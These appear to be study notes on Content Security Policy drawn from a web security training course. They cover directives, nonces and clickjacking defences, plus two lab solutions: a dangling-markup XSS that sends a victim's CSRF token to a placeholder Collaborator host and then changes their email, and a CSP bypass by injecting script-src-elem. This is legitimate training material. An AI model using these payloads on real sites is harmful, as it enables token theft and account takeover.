# CSP Content Security Policy 

CSP is a browser security mechanism that aims to mitigate XSS and some other attacks. It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages.

To enable CSP, a response needs to include an HTTP response header called Content-Security-Policy with a value containing the policy. The policy itself consists of one or more directives, separated by semicolons.

## Mitigating XSS attacks using CSP

The following directive will only allow scripts to be loaded from the same origin as the page itself:
```script-src 'self'```

The following directive will only allow scripts to be loaded from a specific domain:
```script-src https://scripts.normal-website.com```

Care should be taken when allowing scripts from external domains. If there is any way for an attacker to control content that is served from the external domain, then they might be able to deliver an attack. For example, content delivery networks (CDNs) that do not use per-customer URLs, such as ajax.googleapis.com, should not be trusted, because third parties can get content onto their domains.

In addition to whitelisting specific domains, content security policy also provides two other ways of specifying trusted resources: nonces and hashes:

- The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable by an attacker.
- The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value that is specified in the directive.

It's quite common for a CSP to block resources like script. However, many CSPs do allow image requests. This means you can often use img elements to make requests to external servers in order to disclose CSRF tokens, for example.

Some browsers, such as Chrome, have built-in dangling markup mitigation that will block requests containing certain characters, such as raw, unencoded new lines or angle brackets.

Some policies are more restrictive and prevent all forms of external requests. However, it's still possible to get round these restrictions by eliciting some user interaction. To bypass this form of policy, you need to inject an HTML element that, when clicked, will store and send everything enclosed by the injected element to an external server.

### Reflected XSS protected by very strict CSP, with dangling markup attack

This lab using a strict CSP that blocks outgoing requests to external web sites.

To solve the lab, first perform a cross-site scripting attack that bypasses the CSP and exfiltrates a simulated victim user's CSRF token using Burp Collaborator. You then need to change the simulated user's email address to *hacker@evil-user.net*.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:

```<a href="">Click me</a>```

**Solution:**
1. Log in to the lab using the account provided above.
2. Examine the change email function. Observe that there is an XSS vulnerability in the *email* parameter.
3. Go to the Collaborator tab.
4. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
5. Back in the lab, go to the exploit server and add the following code, replacing *YOUR-LAB-ID* and *YOUR-EXPLOIT-SERVER-ID* with your lab ID and exploit server ID respectively, and replacing *YOUR-COLLABORATOR-ID* with the payload that you just copied from Burp Collaborator.
    ```
    <script>
    if(window.name) {
        new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
        } else {
            location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
    }
    </script>
    ```
6. Click "Store" and then "Deliver exploit to victim". When the user visits the website containing this malicious script, if they click on the "Click me" link while they are still logged in to the lab website, their browser will send a request containing their CSRF token to your malicious website. You can then steal this CSRF token using Burp Collaborator.
7. Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see an HTTP interaction that was initiated by the application. Select the HTTP interaction, go to the request tab, and copy the user's CSRF token.
8. With Burp's Intercept feature switched on, go back to the change email function of the lab and submit a request to change the email to any random address.
9. In Burp, go to the intercepted request and change the value of the email parameter to *hacker@evil-user.net*.
10. Right-click on the request and, from the context menu, select "Engagement tools" and then "Generate CSRF PoC". The popup shows both the request and the CSRF HTML that is generated by it. In the request, replace the CSRF token with the one that you stole from the victim earlier.
11. Click "Options" and make sure that the "Include auto-submit script" is activated.
12. Click "Regenerate" to update the CSRF HTML so that it contains the stolen token, then click "Copy HTML" to save it to your clipboard.
13. Drop the request and switch off the intercept feature.
14. Go back to the exploit server and paste the CSRF HTML into the body. You can overwrite the script that we entered earlier.
15. Click "Store" and "Deliver exploit to victim". The user's email will be changed to *hacker@evil-user.net*.

## Mitigating dangling markup attacks using CSP
The following directive will only allow images to be loaded from the same origin as the page itself:
```img-src 'self'```

The following directive will only allow images to be loaded from a specific domain:
```img-src https://images.normal-website.com```

Note that these policies will prevent some dangling markup exploits, because an easy way to capture data with no user interaction is using an img tag. However, it will not prevent other exploits, such as those that inject an anchor tag with a dangling *href* attribute.

## Bypassing CSP with policy injection

You may encounter a website that reflects input into the actual policy, most likely in a *report-uri* directive. If the site reflects a parameter that you can control, you can inject a semicolon to add your own CSP directives. Usually, this *report-uri* directive is the final one in the list. This means you will need to overwrite existing directives in order to exploit this vulnerability and bypass the policy.

Normally, it's not possible to overwrite an existing *script-src* directive. However, Chrome recently introduced the *script-src-elem* directive, which allows you to control *script* elements, but not events. Crucially, this new directive allows you to overwrite existing script-src directives. Using this knowledge, you should be able to solve the following lab.

### Reflected XSS protected by CSP, with CSP bypass

This lab uses CSP and contains a reflected XSS vulnerability.

To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the *alert* function.

Please note that the intended solution to this lab is only possible in Chrome.

**Solution:**
1. Enter the following into the search box:
    ```<img src=1 onerror=alert(1)>```
2. Observe that the payload is reflected, but the CSP prevents the script from executing.
3. In Burp Proxy, observe that the response contains a *Content-Security-Policy* header, and the *report-uri* directive contains a parameter called *token*. Because you can control the *token* parameter, you can inject your own CSP directives into the policy.
4. Visit the following URL, replacing *YOUR-LAB-ID* with your lab ID:
    ```https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27```
    The injection uses the *script-src-elem* directive in CSP. This directive allows you to target just *script* elements. Using this directive, you can overwrite existing *script-src* rules enabling you to inject *unsafe-inline*, which allows you to use inline scripts.

## Protecting against clickjacking using CSP

The following directive will only allow the page to be framed by other pages from the same origin:
```frame-ancestors 'self'```

The following directive will prevent framing altogether:
```frame-ancestors 'none'```

Using content security policy to prevent clickjacking is more flexible than using the X-Frame-Options header because you can specify multiple domains and use wildcards. For example:
```frame-ancestors 'self' https://normal-website.com https://*.robust-website.com```

CSP also validates each frame in the parent frame hierarchy, whereas X-Frame-Options only validates the top-level frame.

Using CSP to protect against clickjacking attacks is recommended. You can also combine this with the *X-Frame-Options* header to provide protection on older browsers that don't support CSP, such as Internet Explorer.